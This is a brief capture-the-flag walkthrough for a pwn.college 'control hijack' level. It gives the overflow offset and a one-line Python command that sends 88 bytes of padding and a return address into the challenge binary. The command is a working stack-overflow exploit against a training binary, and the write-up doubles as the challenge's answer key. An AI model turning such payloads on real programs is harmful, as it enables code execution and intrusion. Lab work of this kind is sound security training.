# Stage 10: Control Hijack (Hard) — CTF Walkthrough

## Module Metadata

| Field | Value |
|-------|-------|
| **Module Name** | Pwn.College — Binary Exploitation |
| **Level** | Hard |
| **Estimated Time** | — |
| **Category** | Binary Exploitation / Reversing |
| **Platform** | Linux x86-64 |
| **Binary** | `binary-exploitation-control-hijack` |
| **VT Score** | N/A |

---

## Challenge

`/challenge/binary-exploitation-control-hijack`. Same hijack at a larger offset: 88 bytes of `A` padding followed by the 8-byte little-endian address `0x0000000000402156`.

## Solution

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*88 + b'\x56\x21\x40\x00\x00\x00\x00\x00')" | /challenge/binary-exploitation-control-hijack
```
